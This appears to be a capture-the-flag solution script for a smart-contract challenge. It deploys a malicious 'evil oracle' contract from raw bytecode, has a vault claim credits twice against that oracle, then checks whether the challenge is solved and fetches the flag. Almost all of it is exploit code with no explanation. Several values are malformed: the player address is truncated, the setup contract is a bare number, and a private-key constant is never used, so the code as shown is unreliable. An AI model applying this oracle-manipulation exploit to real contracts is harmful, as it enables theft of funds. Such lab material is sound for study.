**Solution**

```
(async () => {

const RPC = "host/rpc/7f513440b0e80";
const PRIV = "67313d3cc4";
const PLAYER = "0x20F4896";
const SETUP = "24319";

async function rpc(method, params) {
  const res = await fetch(RPC, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({jsonrpc:"2.0", id:1, method, params})
  });
  return await res.json();
}

function hexPad(addr) {
  return "0".repeat(24) + addr.slice(2);
}

const nonceRsp = await rpc("eth_getTransactionCount", [PLAYER, "latest"]);
let nonce = nonceRsp.result;

console.log("Deploying evil oracle…");

const bytecode =
  "0x608060405234801561001057600080fd5b5061011c806100206000396000f3fe608060405260043610601c5760003560e01c8063c19d93fb146021575b600080fd5b60276029565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c19d93fb846040518263ffffffff1660e01b81526004018163ffffffff1660e01b815260040193505050506000905090565bfea26469706673582212202ca1e57d9eff1c5f32983496ebed5a1b9dab093f2e75cdc28ff669d809f63baa64736f6c63430008180033";

const txDeploy = {
  from: PLAYER,
  data: bytecode,
  gas: "0x500000",
  nonce
};

const rawDeploy = await rpc("eth_sendTransaction", [txDeploy]);
const txHash = rawDeploy.result;

let receipt;
while (true) {
  const rc = await rpc("eth_getTransactionReceipt", [txHash]);
  if (rc.result) { receipt = rc.result; break; }
  await new Promise(r => setTimeout(r, 1000));
}

const EVIL = receipt.contractAddress;
console.log("Evil Oracle address:", EVIL);

nonce = "0x" + (parseInt(nonce) + 1).toString(16);

const vaultRaw = await rpc("eth_call", [{
  to: SETUP,
  data: "0x3af9e669"   // vault()
}, "latest"]);

const VAULT = "0x" + vaultRaw.result.slice(26);
console.log("Vault:", VAULT);

const claimData = "0xe3bd1f45" + hexPad(EVIL);

console.log("Claim #1...");
await rpc("eth_sendTransaction", [{
  from: PLAYER,
  to: VAULT,
  data: claimData,
  gas: "0x200000",
  nonce
}]);
nonce = "0x" + (parseInt(nonce) + 1).toString(16);

console.log("Claim #2...");
await rpc("eth_sendTransaction", [{
  from: PLAYER,
  to: VAULT,
  data: claimData,
  gas: "0x200000",
  nonce
}]);
nonce = "0x" + (parseInt(nonce) + 1).toString(16);

const creditsRaw = await rpc("eth_call", [{
  to: VAULT,
  data: "0x3de4eb60" + hexPad(PLAYER)
}, "latest"]);

console.log("Credits =", parseInt(creditsRaw.result, 16).toString());

const solvedRaw = await rpc("eth_call", [{
  to: SETUP,
  data: "0x6d4ce63c"      // isSolved()
}, "latest"]);

console.log("Solved =", solvedRaw.result === "0x1");

if (solvedRaw.result === "0x1") {
  const flag = await fetch("host/api/flag/7f513440-e565-42b1-9c79-cbe3f92b0e80")
    .then(r => r.text());
  console.log("FLAG:", flag);
} else {
  console.log("Not solved yet.");
}

})();

```
